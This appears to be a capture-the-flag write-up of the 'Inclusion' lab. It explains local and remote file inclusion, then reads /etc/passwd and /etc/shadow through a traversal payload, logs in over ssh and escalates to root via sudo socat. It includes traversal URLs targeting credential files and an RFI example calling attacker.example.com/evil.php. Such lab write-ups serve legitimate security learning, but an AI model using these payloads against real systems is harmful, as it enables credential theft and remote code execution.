# INCLUSION

##### Written: 17/05/2021

##### IP Address: 10.10.16.93

<br>

First, I ran a basic nmap scan on the target machine with standard scripts loaded and version enumeration configured. The results are as follows:

<img style="float: left;" src="screenshots/screenshot1.png">

As we can see, there are two services running on the target machine: **ssh** and **http**. For the http server, we can see that the http-title is 'My blog'.

<br>

Let's first check out the http webserver. Navigating to the website in my web browser, I came to this page:

<img style="float: left;" src="screenshots/screenshot2.png">

Before I conducted my happy-path enumeration, I started a Gobuster directory scan to see if I can obtain any hidden directories. The Gobuster command used was:

```
gobuster dir -u http://10.10.16.93 -x php,js,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

I made sure to include common extensions in my enumeration, such as **.php** and **.js**. I also used Dirbuster's directory-list-2.3-medium.txt as the wordlist.

While the scan was going on, I started to explore the website. First I checked the source code to see if there was any additional information, such as comments left behind by the developer. There was none unfortunately.

Next, I tried some low-hanging fruit such as visiting **/robots.txt** but those did not result in anything of value.

When I typed something into the search bar on the top right of the webpage and pressed search, I was redirected back to the homepage. Since this CTF room is called 'Inclusion', I'll probably have to carry out some form of **Local File Inclusion attack** using this search field.

At the bottom of the web page, there were three sections dedicated to different paragraphs of text. Looks like they taught us more about Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks! This will be useful as I currently have no idea what those attacks are. Clicking on the 'View Details' button below the sections brought me to pages with just text in them. I checked the source code for each of these dedicated pages but there was nothing of value.

Time to learn more about LFI and RFI attacks.

<br>

#### Local File Inclusion

From my research, I learnt that Local File Inclusion attacks occur when a web page takes in a **file path** as input in order to access a file that exists locally (on the webserver). However, if the developer does not conduct proper input sanitization, attackers can exploit this by passing in a path that leads to another file. Below is an example of proper usage of file inclusion:

```
https://example.com/?module=contact.php
```

Here, the web server is taking an input **'module'** and the value to be the file **'contact.php'**. Of course, it would seem that contact.php is in the same directory as the calling file, and hence the name can be inputted directly.

What an attacker can then do is to replace contact.php with another path that leads to another file, such as this:

```
https://example.com/?module=../../../../../../../etc/shadow
```

*(Note that the many ../../../../../../ is used for directory traversal to bring the current directory back to the / directory on the local filesystem)*

Now the contents of the local **/etc/shadow** file will be returned, which is clearly not something that should happen.

If the attacker has managed to upload a malicious file onto the webserver, let's say a .php script that sets up a reverse shell, then they can also use the LFI attack to make the web server call the malicious.php file that they've uploaded. The web server will then execute the script:

```
https://example.com/?module=../../../uploads/malicious.php
```

<br>

#### Remote File Inclusion

In essence, RFI attack vulnerabilities stem from the same root issue as LFI attacks. The only difference is that instead of providing a path to a file on the local filesystem, the attacker instead provides a url to another web server (controlled by the attacker) to execute malicious code that is hosted on that web server. For example:

```
http://example.com/?file=http://attacker.example.com/evil.php
```

<Br>

Now that I had a better understanding of how LFI and RFI attacks work, I could try to execute the attack against the target machine. First, I tried to find points within the web page in which I could mount that attack. 

At first, I tried to use the search field to see if the web server accepted any input parameter. However, every time I searched for something, I noticed that I was simply being redirected back to the home page. Furthermore, I could tell from the URL that there was not any input being taken in:

<img style="float: left;" src="screenshots/screenshot3.png">



<br>

Next, I checked whether the web server took inputs when I clicked on the **'View Details'** buttons located at the bottom of the webpage. Sure enough, they did indeed practiced file inclusion, which means that I could attempt to mount an attack there!

<img style="float: left;" src="screenshots/screenshot4.png">

It seemed that the web server was taking in an input **'name'** and the filename that produced the wall of text shown on the page was called **'hacking'**.

<br>

I'll try to change **'hacking'** to **'../../../../../etc/passwd'** to see if I can read the /etc/passwd file.

<img style="float: left;" src="screenshots/screenshot5.png">

The attack worked! The contents of the /etc/passwd file is displayed by the web server. Next, I'll try if I can read the **/etc/shadow** file. If I can do so, I'll be able to obtain the credentials of users on the machine, such as root.

<img style="float: left;" src="screenshots/screenshot6.png">

Sure enough, I could read the /etc/shadow file, which is great. From the file, I can see that there is a user account called **FalconFeast**. At first, I was going to use **John the Ripper** to crack the password of FalconFeast using the hashed password found in the /etc/shadow file. However, looking closer at the /etc/passwd file, I noticed a comment in the file:

 <img style="float: left;" src="screenshots/screenshot7.png">

On the right, we can see the text **'falconfeast:rootpassword'** Could **'rootpassword'** be the password for falconfeast? 

<br>

To test this, I tried to ssh into falconfeast's account using the password:

<img style="float: left;" src="screenshots/screenshot8.png">

Nice, that was his password after all. 

**With that, I could obtain the user.txt**

<br>

---

Since I'm already in the machine, I could try to escalate my privileges from the inside. Before using a privilege escalation automation script like **linpeas**, I first did some manual enumeration first. 

First, I ran the command

```
sudo -l
```

to see what sudo privileges that falconfeast had.

<img style="float: left;" src="screenshots/screenshot9.png">

Looks like he can run **socat** as root. Next, I went to **GTFOBins** to see if there were any vulnerabilities that I could exploit with this binary.

<br>

After looking through GTFOBins, I decided to use socat to spawn a shell as root

<img style="float: left;" src="screenshots/screenshot10.png">

After running the command above, I managed to spawn a shell as root:

<img style="float: left;" src="screenshots/screenshot11.png">

**With that, I can easily navigate towards root's home directory and obtain root.flag**

